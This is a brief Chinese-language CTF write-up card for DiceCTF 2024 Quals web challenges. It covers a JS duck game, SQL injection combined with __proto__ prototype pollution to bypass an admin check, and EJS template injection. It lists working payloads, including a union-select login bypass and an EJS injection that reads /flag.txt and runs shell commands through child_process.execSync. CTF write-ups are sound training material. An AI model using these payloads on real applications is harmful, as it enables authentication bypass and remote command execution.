---
title: "DiceCTF 2024 Quals Writeups"
category: web
tags: ["DiceCTF 2024 Quals", "web", "web", "js", "prototype-pollution", "ejs-ssti"]
signals: ["DiceCTF 2024 Quals 2024", "web", "js", "prototype-pollution", "ejs-ssti", "base64", "sql-injection", "auth-bypass", "duck", "web_unknown", "DiceCTF", "SQL", "EJS", "SSTI"]
difficulty: medium
source: "https://www.ctfiot.com/160792.html"
tools: []
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# DiceCTF 2024 Quals Writeups

> 赛事：DiceCTF 2024 Quals 2024 | 方向：web | 难度：medium

## 一句话总结

DiceCTF 2024：JS鸭子游戏+SQL注入+原型链污染+EJS SSTI

## 攻击链

1. Dice Dice Goose: history.push([player, goose])×8步编码base64
2. score==9 → flag
3. 历史解: player[0]++ / goose[1]--
4. funnylogin: SQL注入 + isAdmin[__proto__] 原型链污染
5. SQL: '' union select ''1 拿 id=1
6. 污染 __proto__ 让 isAdmin 检查通过
7. EJS SSTI: <%- include(''/flag.txt'') %>
8. <%- global.process.mainModule.require('child_process').execSync('ls -la') %>

## 关键 payload

```
user=__proto__&pass='%20union%20select%20'1
```

## 经验教训

SQL注入+'__proto__'污染isAdmin对象可绕过认证

## 标签

web、js、prototype-pollution、ejs-ssti、base64、sql-injection、auth-bypass、duck

## 参考来源

- https://www.ctfiot.com/160792.html
- 原文件：DiceCTF_2024_Quals_Writeups.full.md
